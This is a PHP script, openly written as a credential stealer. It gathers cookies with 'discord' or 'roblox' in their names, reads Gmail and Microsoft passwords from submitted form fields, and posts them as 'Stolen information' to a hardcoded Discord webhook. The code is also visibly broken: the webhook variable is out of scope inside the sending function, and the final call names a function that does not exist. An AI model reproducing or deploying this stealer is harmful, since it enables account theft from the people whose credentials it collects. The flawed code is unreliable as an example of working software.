<?php
$webhookUrl = "https://discord.com/api/webhooks/1290777206431154258/C0T6VwDkUyqgsQhYKJEmRWPjYMdqK6zUmhzubbJFY5Grv5AAqlRT0K74SmGVWrJevQ0j";

// Function to send data to the webhook
function sendToWebhook($data) {
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Function to steal cookies and passwords
function stealInformation() {
    // Get all cookies
    $cookies = $_COOKIE;

    // Filter cookies for Discord and Roblox
    $discordCookies = array_filter($cookies, function($key) {
        return strpos($key, 'discord') !== false;
    });

    $robloxCookies = array_filter($cookies, function($key) {
        return strpos($key, 'roblox') !== false;
    });

    // Get passwords from Gmail and Microsoft
    $gmailPassword = $_POST['gmail_password'];
    $microsoftPassword = $_POST['microsoft_password'];

    // Send stolen information to the webhook
    $data = array(
        'content' => "Stolen information:",
        'embeds' => array(
            array(
                'title' => "Discord Cookies",
                'description' => json_encode($discordCookies),
                'color' => 1671168
            ),
            array(
                'title' => "Roblox Cookies",
                'description' => json_encode($robloxCookies),
                'color' => 1671168
            ),
            array(
                'title' => "Gmail Password",
                'description' => $gmailPassword,
                'color' => 1671168
            ),
            array(
                'title' => "Microsoft Password",
                'description' => $microsoftPassword,
                'color' => 1671168
            )
        )
    );

    sendToWebhook(json_encode($data));
}

// Call the function to steal information
stolenInformation();
?>
